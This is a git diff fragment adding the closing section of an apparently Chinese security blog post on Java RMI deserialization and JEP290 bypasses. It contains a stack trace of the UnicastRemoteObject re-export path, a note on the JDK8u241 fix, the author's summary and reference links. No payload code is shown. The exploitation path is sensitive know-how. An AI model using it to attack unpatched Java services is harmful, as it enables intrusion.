+invoke:179, RemoteObjectInvocationHandler (java.rmi.server)
+createServerSocket:-1, $Proxy0 (com.sun.proxy)
+newServerSocket:666, TCPEndpoint (sun.rmi.transport.tcp)
+listen:335, TCPTransport (sun.rmi.transport.tcp)
+exportObject:254, TCPTransport (sun.rmi.transport.tcp)
+...
+exportObject:346, UnicastRemoteObject (java.rmi.server)
+reexport:268, UnicastRemoteObject (java.rmi.server)
+readObject:235, UnicastRemoteObject (java.rmi.server)</code></pre>
+
+<h1 id="JDK8u241修复"><a href="#JDK8u241修复" class="headerlink" title="JDK8u241修复"></a>JDK8u241修复</h1><p>在调用UnicastRef.invoke之前声明方法的类，必须要实现Remote接口，然而这里的RMIServerSocketFactory并没有实现，于是无法进入到invoke方法，直接抛出错误。</p>
+<p>抬走了，等一手0day</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然写完了，但实际上还有许多细节的部分有点不懂，比如对于绕过JEP290的方式中，触发反序列化具体的路径是哪里之类的，因为有点懒所以并没有仔细的跟过，还有就是感谢互联网的共享精神（，感觉这三篇rmi里，有一篇半都是照抄别人的内容。</p>
+<p>最后偷张图</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/20200702100127-f0d4c18c-bc07-1.png" alt="20200702100127-f0d4c18c-bc07-1"></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1689/">https://paper.seebug.org/1689/</a> （前两部分基本上都抄的这个</p>
+<p><a target="_blank" rel="noopener" href="https://halfblue.github.io/2021/11/03/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-JEP290%E7%BB%95%E8%BF%87/">RMI反序列化漏洞之三顾茅庐-JEP290绕过 | Halfblue</a>（UnicastRef的反序列化的部分细节可以看这个</p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%83%A8%E5%88%86%E9%83%BD%E6%8A%84%E7%9A%84%E8%BF%99%E4%B8%AA">https://su18.org/post/rmi-attack/（反序列化部分都抄的这个</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7932">https://xz.aliyun.com/t/7932</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/211722">https://www.anquanke.com/post/id/211722</a></p>
+<p><a target="_blank" rel="noopener" href="https://yagsheg.com/2021/11/29/RMI-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93">https://yagsheg.com/2021/11/29/RMI-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93</a></p>
 
                 
             </div>
@@ -1414,7 +1796,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">240.8k</span>
+                        class="white-color">245.4k</span>
             
             
             
